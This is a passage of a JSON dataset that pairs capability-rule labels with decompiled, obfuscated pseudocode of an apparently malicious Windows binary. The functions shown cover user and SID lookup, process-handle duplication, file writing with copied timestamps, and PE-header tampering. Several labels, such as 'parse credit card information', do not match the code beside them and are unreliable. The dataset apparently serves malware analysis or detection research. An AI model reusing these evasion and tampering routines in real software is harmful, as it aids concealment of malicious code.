param_3[2] = 0x2b;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x40;\n        cVar7 = param_1 >> 8;\n        bVar13 = SCARRY1(cVar7, *unaff_EBX);\n        cVar7 = cVar7 + *unaff_EBX;\n        param_1 = param_1 & 0xffff0000 | CONCAT11(cVar7, param_1);\n        bVar12 = cVar7 < '\\0';\n    }\n    if ((bVar13 == bVar12) && (bVar13 != bVar12)) {\n        in_SS = unaff_EDI;\n        unaff_ESI = unaff_ESI + -1;\n        pcVar10 = unaff_EDI | puVar9;\n        unaff_EDI = pcVar10 + 1;\n        *pcVar10 = param_3;\n        param_2 = param_2 & 0xffffff00;\n        param_3 = param_3 & 0xffff0000 | param_3 + (param_3 >> 8) * 'y';\n    }\n    param_3[3] = 0x9a;\n    uVar5 = param_1;\n    bVar12 = (POPCOUNT((uVar5 | 0x31fd) & 0xff) & 1U) == 0;\n    uVar4 = *(puVar9 + 8);\n    *(uVar4 + 4) = 0x3a;\n    if ((bVar12) || (!bVar12)) {\n        *(uVar4 + 5) = 0x84;\n        uVar3 = uVar5 - 1;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x40;\n        uVar4 = uVar4 + 0x66495184;\n        uVar3 = uVar5;\n    }\n    bVar12 = (uVar3 & unaff_EDI | 0x61be) == 0;\n    *(uVar4 + 6) = 0x57;\n    if ((!bVar12) && (bVar12)) {\n        uVar4 = uVar4 & 0xe2f4cc58;\n        bVar12 = uVar4 == 0;\n    }\n    *(uVar4 + 7) = 0x3b;\n    if ((bVar12) || (param_1 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  !bVar12)) {\n        *(uVar4 + 8) = 0x22;\n    }\n    else {\n        unaff_EDI = CONCAT22(uVar5, in_SS);\n        *param_2 = *param_2 | uVar4 >> 8;\n    }\n    puVar6 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - cVar8, param_1);\n    iVar1 = *(puVar9 + 8);\n    *(iVar1 + 9) = 0xa4;\n    if (puVar6 == param_2) {\ncode_r0x00402f9d:\n        uVar5 = param_1;\n        *(iVar1 + 10) = 0xaa;\n        piStack24 = unaff_ESI;\n        if (puVar6 <= param_2) goto code_r0x00402fab;\n    }\n    else {\n        piStack24 = param_1 << 0x10;\n        param_1 = param_1 & 0xffff;\n        uVar5 = param_1;\n        if (puVar6 != param_2) goto code_r0x00402f9d;\n    }\n    piStack24 = piStack24 & 0xffff0000 | in_SS;\n    uVar3 = uVar5 >> 8;\n    uVar5 = uVar5 & 0xff;\n    unaff_EDI = piStack24;\n    if ((uVar3 | param_2[0x5e560876]) == 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\ncode_r0x00402fab:\n    *(iVar1 + 0xb) = 0x61;\n    *(iVar1 + 0xc) = 0x92;\n    bVar12 = (POPCOUNT((uVar5 | 0x31fd) & 0xff) & 1U) == 0;\n    uVar4 = *(puVar9 + 8);\n    *(uVar4 + 0xd) = 0xee;\n    if ((bVar12) || (!bVar12)) {\n        *(uVar4 + 0xe) = 0x42;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x41;\n        param_2 = param_2 + 1;\n    }\n    bVar12 = (CONCAT11(((iVar1 >> 8) - cVar8) + 'M', iVar1) & 0x26ae) != 1;\n    *(uVar4 + 0xf) = 0x84;\n    if ((bVar12) && (!bVar12)) {\n        out(*unaff_ESI, param_2);\n    }\n    *(uVar4 + 0x10) = 0xb2;\n    uVar4 = uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) - cVar8, uVar4);\n    iVar1 = *(puVar9 + 8);\n    *(iVar1 + 0x11) = 0x3a;\n    if ((param_2 <= uVar4) && (uVar4 < param_2)) {\n        out(0xc4, iVar1);\n        *unaff_EDI = iVar1;\n    }\n    **(puVar9 + 0xc) = 0x12;\n    return iVar1;\n}\n",
        "token_count": 1810
    },
    "00403410": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040343f) overlaps instruction at (ram,0x0040343c)\n// \n// WARNING: Removing unreachable block (ram,0x0040343f)\n\nuint __cdecl fcn.00403410(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint *var_10h;\n    uint *pcbBuffer;\n    uint *var_8h;\n    uint *var_4h;\n    uint *puStack4;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puStack4 = &var_10h;\n    var_4h = &var_8h;\n    var_8h = &var_31ch;\n    pcbBuffer = &var_4h;\n    var_10h = &Sid;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar1 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "00402640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402655) overlaps instruction at (ram,0x00402652)\n// \n\nuint __cdecl fcn.00402640(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    ushort in_CX;\n    uint8_t *in_EDX;\n    bool in_ZF;\n    ushort in_stack_fffffff4;\n    uint uVar2;\n    \n    if (!in_ZF) {\n        uVar2 = CONCAT22(in_CX, in_stack_fffffff4);\n        if (in_ZF) goto code_r0x0040264e;\n    }\n    uVar2 = 0;\n    in_EAX = arg_8h;\ncode_r0x0040264e:\n    *in_EDX = *in_EDX | in_CX >> 8;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(in_EAX, 0x47, uVar2);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 235
    },
    "00402680": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026a7) overlaps instruction at (ram,0x004026a5)\n// \n\nbool __fastcall fcn.00402680(int32_t param_1, char *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    uint *in_EAX;\n    int32_t iVar2;\n    uchar *puVar4;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar5;\n    uint8_t in_AF;\n    uchar auStack272 [264];\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    bVar5 = (POPCOUNT(auStack272 & 0xff) & 1U) != 0;\n    uStack8 = 0x104;\n    if (bVar5) {\n        if (!bVar5) {\n            out(*unaff_ESI, param_2);\n            do {\n                cVar3 = in_EAX >> 8;\n                in_AF = 9 < (in_EAX & 0xf) | in_AF;\n                in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar3 - in_AF), -in_AF);\n            } while (in_AF || cVar3 == *param_2);\n            piVar1 = unaff_EDI + param_2 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(param_1 + -0x73) = in_EAX;\n            puVar4 = &stack0xfffffffd;\n            goto code_r0x004026aa;\n        }\n    }\n    in_EAX = &uStack8;\ncode_r0x004026aa:\n    iVar2 = fcn.00403af0(0x80000002, 0x4072f0, 0x407330, puVar4 + -8, puVar4 + -0x10c, in_EAX);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(puVar4 + -0x10c, 0);\n    return iVar2 != -1;\n}\n",
        "token_count": 496
    },
    "00402a00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a00(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x407048;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00402350(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1154
    },
    "004036e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004036e0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00402510();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00403eb0();\n    iVar1 = fcn.004021a0(0x407074);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00401bf0();\n    *0x41e888 = 1;\n    iVar1 = fcn.00404d70();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00404b30(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403100(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00401230(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 699
    },
    "00403900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403997) overlaps instruction at (ram,0x00403996)\n// \n// WARNING: Removing unreachable block (ram,0x00403987)\n\nuint __cdecl fcn.00403900(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004021a0(0x40707c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 253
    },
    "004039b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a5a) overlaps instruction at (ram,0x00403a58)\n// \n\nuint __cdecl fcn.004039b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    *0x41e884 = fcn.00402680();\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_ch_00 == -1) {\n        return 0;\n    }\n    iVar2 = arg_ch_00;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_ch_00, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 != 0) {\n        if (((-1 < iVar1) && (-1 >= iVar1)) || (*0x41e884 != 0)) {\n            iVar2 = fcn.00403900(iVar2);\n            *0x41e884 = iVar2 == 0;\n        }\n        fcn.00402a00(0, arg_ch_00);\n        if (*0x41e884 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 346
    },
    "00404d70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d9b) overlaps instruction at (ram,0x00404d92)\n// \n\nuint fcn.00404d70(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    iVar1 = fcn.00402350(0x407010);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x5027e95e;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 153
    },
    "00402480": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00402480(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar1) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 321
    },
    "00402590": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.00402590(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41e858 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e858 = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00402e30": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402e30(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402b80(&var_68h, &var_4h);\n    fcn.00404cf0(&var_68h, var_4h, 0x4074a0, 0xa3a0);\n    *arg_8h = 0x4074a0;\n    *arg_ch = 0xa3a0;\n    return;\n}\n",
        "token_count": 261
    },
    "00403f90": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool fcn.00403f90(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 286
    },
    "00402770": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040288c) overlaps instruction at (ram,0x0040288b)\n// \n\nuint __cdecl fcn.00402770(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    uint *arg_20h;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint uVar4;\n    char extraout_DL;\n    uint extraout_EDX;\n    uint uVar5;\n    uchar *puVar6;\n    uint *unaff_ESI;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint *unaff_EDI;\n    uint *puVar9;\n    bool bVar10;\n    float10 extraout_ST0;\n    uchar var_20h;\n    uint var_1fh;\n    \n    puVar6 = &stack0xfffffffc;\n    if (((0x1f < &stack0xfffffffc && *0x10 != 0x24) && (0x1f >= &stack0xfffffffc || *0x10 == 0x24)) ||\n       ((POPCOUNT(&var_20h & 0xff) & 1U) != 0)) {\n        *unaff_EDI = *unaff_ESI;\n        puVar6 = 0x7ae181d0;\n        *(unaff_ESI + 0x55) = *(unaff_ESI + 0x55) | &stack0xffffffce >> 8;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    arg_20h = fcn.00402480(*(puVar6 + 0x18), *(puVar6 + 0x1c), 0x407054, 7);\n    if (arg_20h == NULL) {\n        return 0;\n    }\n    if ((-1 < arg_20h) && (-1 >= arg_20h)) {\n        *(unaff_EDI + 7) = extraout_ST0;\n    }\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    puVar6[-0x20] = 0;\n    puVar8 = puVar6 + -0x1f;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uVar7 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        puVar6[uVar7 - 0x20] = uVar2;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x20);\n    puVar8 = puVar6 + -0x20;\n    puVar9 = arg_20h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    bVar10 = (POPCOUNT(extraout_DL + -0x51) & 1U) == 0;\n    fcn.00403d00(*(puVar6 + 8), *(puVar6 + 0xc), *(puVar6 + 0x10), *(puVar6 + 0x14), puVar6 + -0x20, 0x20, arg_20h);\n    if ((bVar10) || (uVar4 = extraout_ECX,  uVar5 = extraout_EDX,  !bVar10)) {\n        uVar4 = *(puVar6 + 0x1c);\n        uVar5 = *(puVar6 + 0x18);\n    }\n    *(arg_20h + 0x558b1c4d) = *(arg_20h + 0x558b1c4d) | 0x18;\n    fcn.00402380(uVar5, uVar4);\n    return 1;\n}\n",
        "token_count": 952
    },
    "00403530": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403576) overlaps instruction at (ram,0x00403575)\n// \n\nint32_t __thiscall fcn.00403530(uint32_t param_1, uint32_t param_2, uint param_3, int32_t param_4)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EBX;\n    int16_t unaff_DI;\n    bool bVar4;\n    uint8_t in_stack_895576be;\n    \n    bVar4 = (unaff_DI + 0x2562U & 0xffffff00 | unaff_DI + 0x2562U | 0x4c | param_1) < 0;\n    if ((bVar4) || (!bVar4)) {\n        if (param_4 == 0) goto code_r0x004035c8;\n    }\n    else {\n        uVar3 = in_EAX + 0x890c458bU | 0x8b;\n        pcVar1 = uVar3 + 0x66;\n        *pcVar1 = *pcVar1 + (in_EAX + 0x890c458bU >> 8) + CARRY1(in_stack_895576be, uVar3);\n    }\n    do {\n        uVar3 = *(unaff_EBX + 8) + **(unaff_EBX + 0xc);\n        *(unaff_EBX + 8) = uVar3;\n        if (uVar3 >> 0x10 != 0) {\n            *(unaff_EBX + 8) = (uVar3 >> 0x10) + (uVar3 & 0xffff);\n        }\n        iVar2 = *(unaff_EBX + 0x10) + -1;\n        *(unaff_EBX + 0xc) = *(unaff_EBX + 0xc) + 2;\n        *(unaff_EBX + 0x10) = iVar2;\n    } while (iVar2 != 0);\n    param_2 = *(unaff_EBX + 8);\ncode_r0x004035c8:\n    return (param_2 >> 0x10) + param_2;\n}\n",
        "token_count": 507
    },
    "00403210": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033f8) overlaps instruction at (ram,0x004033f7)\n// \n\nuint64_t __cdecl fcn.00403210(int16_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t extraout_ECX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t in_EDX;\n    int32_t *piVar8;\n    char *pcVar9;\n    uint extraout_EDX;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *unaff_EDI;\n    uint *puVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    uint64_t uVar16;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint var_4h;\n    char cVar5;\n    \n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    piVar8 = *(arg_8h + 0x1e) + arg_8h;\n    if (*piVar8 != 0x4550) {\n        return ZEXT48(piVar8) << 0x20;\n    }\n    if ((!SBORROW4(*piVar8, 0x4550)) && (SBORROW4(*piVar8, 0x4550))) {\n        *unaff_EDI = in_stack_00000008;\n        return CONCAT44(unaff_retaddr, in_stack_00000008);\n    }\n    if (piVar8[0x16] != 0) {\n        return ZEXT48(piVar8) << 0x20;\n    }\n    puVar10 = 0x40;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return ZEXT48(piVar8) << 0x20;\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        puVar10 = *(arg_8h + 0x1e) - 0x80;\n    }\n    uVar16 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar10);\n    puVar13 = uVar16;\n    bVar15 = puVar13 == NULL;\n    if (bVar15) {\n        return uVar16 & 0xffffffff00000000;\n    }\n    if ((!bVar15) && (bVar15)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar6 = extraout_ECX;\n    puVar11 = NULL;\n    puVar14 = puVar10;\n    if (puVar10 != NULL) {\n        do {\n            pcVar9 = uVar16 >> 0x20;\n            iVar3 = uVar16;\n            bVar15 = (POPCOUNT(puVar14 & 0xff) & 1U) == 0;\n            if ((bVar15) || (!bVar15)) {\n                pcVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                out(*puVar11, uVar16 >> 0x20);\n                do {\n                    cVar5 = iVar3 >> 8;\n                    in_AF = 9 < (iVar3 & 0xf) | in_AF;\n                    iVar3 = CONCAT31(CONCAT21(iVar3 >> 0x10, cVar5 - in_AF), -in_AF);\n                } while (in_AF || cVar5 == *pcVar9);\n                puVar1 = puVar13 + pcVar9 * 2;\n                uVar7 = *puVar1;\n                uVar2 = *puVar1;\n                *puVar1 = (uVar2 + 0x7b) - in_AF;\n                *(iVar6 + -1) = iVar3;\n                pcVar4 = sym.imp.MSVCRT.dll_rand + iVar3 + (uVar7 < 0xffffff85 || uVar2 + 0x7b < in_AF);\n                puVar11 = puVar11 + 1;\n            }\n            iVar6 = 0xff;\n            uVar16 = CONCAT44(pcVar4 % 0xff, pcVar4 / 0xff);\n            puVar12 = puVar11 + 1;\n            puVar14 = puVar12 - puVar10;\n            *(puVar11 + puVar13) = pcVar4 % 0xff;\n            puVar11 = puVar12;\n        } while (puVar12 < puVar10);\n    }\n    puVar14 = arg_8h + 0x40;\n    for (uVar7 = puVar10 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    for (uVar7 = puVar10 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = *puVar13;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1244
    },
    "00404de0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
